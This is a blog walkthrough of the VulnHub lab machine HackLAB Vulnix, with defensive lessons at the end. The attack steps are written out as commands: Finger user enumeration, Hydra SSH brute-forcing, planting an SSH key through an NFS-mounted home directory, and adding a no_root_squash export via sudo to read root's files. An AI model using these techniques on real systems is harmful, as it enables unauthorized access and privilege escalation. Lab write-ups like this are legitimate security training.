---
layout: default
title: HackLAB Vulnix Vulnhub Machine manually solved sudo privilege escalation machine
description: VulnHub HackLAB Vulnix walkthrough — exploiting sudo misconfigurations and Linux privilege escalation techniques to gain root on a vulnerable machine.
category: vulnhub
---

# HackLAB: Vulnix

- [Tools](#tools)
- [Gaining Access](#gaining-access)
- [Privilege Escalation](#privilege-escalation)
- [Lessons Learned](#lessons-learned)

Machine: [https://www.vulnhub.com/entry/hacklab-vulnix%2C48/](https://www.vulnhub.com/entry/hacklab-vulnix%2C48/)

## Tools

- [NMap](https://nmap.org/) — network scanner
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) — password brute-forcing tool
- ssh — Secure Shell client for remote access

## Gaining Access

1. Deploy the VM with a bridged adapter. After finding the target IP (in my case `192.168.0.8`), run a full port scan:

   ```bash
   nmap -A 192.168.0.8
   ```

   The scan reveals multiple open services: SSH (22), SMTP (25), Finger (79), POP3 (110), and RPCBind (111).

2. The **Finger** service on port 79 is particularly interesting. Finger is an old protocol that leaks user information. Use the `finger-user-enum` script to enumerate valid usernames:

   ```bash
   perl finger-user-enum.pl -U /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt -t 192.168.0.8
   ```

   This reveals several valid usernames, including `user`.

3. With a valid username, brute-force the SSH password using Hydra with the rockyou wordlist:

   ```bash
   hydra -l user -P /opt/wordlist/rockyou.txt 192.168.0.8 ssh -t 4
   ```

   The password for `user` is `letmein`.

4. SSH in and enumerate the system. Check `/etc/passwd` to find a local account called `vulnix` with UID 2008. This account has no login shell by default, but we can still interact with it through NFS.

5. Since NFS is running (port 111), check the exports:

   ```bash
   showmount -e 192.168.0.8
   ```

   The `vulnix` user's home directory is exported via NFS. Mount it:

   ```bash
   mkdir /tmp/vulnix
   mount -t nfs 192.168.0.8:/home/vulnix /tmp/vulnix
   ```

6. Generate an SSH key pair and upload it to the `vulnix` user's authorized_keys:

   ```bash
   ssh-keygen -f vulnix_key -N ""
   mkdir -p /tmp/vulnix/.ssh
   cp vulnix_key.pub /tmp/vulnix/.ssh/authorized_keys
   chmod 600 /tmp/vulnix/.ssh/authorized_keys
   ```

7. SSH in as `vulnix` using the generated key:

   ```bash
   ssh -i vulnix_key vulnix@192.168.0.8
   ```

## Privilege Escalation

1. Check sudo permissions:

   ```bash
   sudo -l
   ```

   The output shows that `vulnix` can edit `/etc/exports` — the NFS export configuration file — without a password.

2. Modify `/etc/exports` to export the root directory:

   ```bash
   sudo bash -c 'echo "/root *(rw,sync,no_root_squash)" >> /etc/exports'
   ```

   The `no_root_squash` option is critical — it means root on the client can map to root on the server, bypassing the usual security restriction.

3. Reboot the VM (or restart the NFS service) to apply the new exports.

4. Mount the root directory from your machine:

   ```bash
   mkdir /tmp/root
   mount -t nfs 192.168.0.8:/root /tmp/root
   ```

5. Read the flag:

   ```bash
   cat /tmp/root/trophy.txt
   # cc614640424f5bd60ce5d5264899c3be
   ```

## Lessons Learned

- **NFS exports are dangerous** — Exporting directories with `no_root_squash` allows remote root access. Always restrict NFS exports to specific IPs and avoid `no_root_squash` unless absolutely necessary.
- **Finger protocol leaks info** — The Finger service exposes user information that aids brute-force attacks. Disable legacy services like Finger, POP3, and SMTP if they're not needed.
- **Sudo + NFS = privilege escalation** — When a user can modify `/etc/exports` via sudo, they can export any directory on the system. This is a common privilege escalation vector on NFS-configured systems.
